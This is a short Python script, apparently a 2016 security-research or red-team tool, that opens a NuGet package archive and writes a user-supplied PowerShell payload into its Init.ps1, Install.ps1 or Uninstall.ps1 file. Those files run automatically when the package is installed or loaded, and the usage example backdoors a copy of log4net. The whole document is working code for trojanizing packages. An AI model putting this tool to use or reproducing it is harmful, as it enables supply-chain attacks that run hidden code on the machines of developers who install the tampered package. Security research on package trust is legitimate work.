# James Otten 2016

import zipfile
import sys
import os
from termcolor import colored

valid_types = ['Init.ps1', 'Install.ps1', 'Uninstall.ps1']

if len(sys.argv) != 4 or sys.argv[2] not in valid_types:
    print('Usage:')
    print(' python %s <nuget_package> <script_target> <payload>' % sys.argv[0])
    print('   where nuget_package is a nuget package')
    print('         script_target is the filename of the script to be added/modified (%s)' % ', '.join(valid_types))
    print('         payload is the payload that will be executed')
    print('')
    print('Example:')
    print(' python %s log4net.2.0.5.nupkg Init.ps1 payload/check_access_level.ps1' % sys.argv[0])
    exit(1)

file_path = sys.argv[1]
script_type = sys.argv[2]
payload_file = sys.argv[3]

payload_header = 'param($installPath, $toolsPath, $package, $project)'


def get_payload(payload_file):
    fd = open(payload_file, 'r')
    payload = fd.read()
    fd.close()
    return payload


def edit_package(file_path, script_type, payload):
    tools_dir = 'tools'
    zf = zipfile.ZipFile(file_path, mode='r')
    file_list = zf.namelist()
    zf.close()
    for zipped_file_name in file_list:
        if zipped_file_name.startswith('Tools/'):
            tools_dir = 'Tools'
    target_filename = '%s/%s' % (tools_dir, script_type)
    if target_filename in file_list:
        # overwrite
        print('Overwrite %s' % target_filename)
        zf = zipfile.ZipFile(file_path, mode='r')
        data = {}
        for f in zf.namelist():
            data[f] = zf.read(f)
        zf.close()
        zf = zipfile.ZipFile(file_path, mode='w', compression=zipfile.ZIP_DEFLATED)
        try:
            for k in data.keys():
                if k == target_filename:
                    zf.writestr(k, '%s\n%s' % (data[k], payload))
                else:
                    zf.writestr(k, data[k])
        finally:
            zf.close()
    else:
        # create file
        print('Add %s' % target_filename)
        zf = zipfile.ZipFile(file_path, mode='a', compression=zipfile.ZIP_DEFLATED)
        try:
            zf.writestr(target_filename, '%s\n%s' % (payload_header, payload))
        finally:
            zf.close()

edit_package(file_path, script_type, get_payload(payload_file))
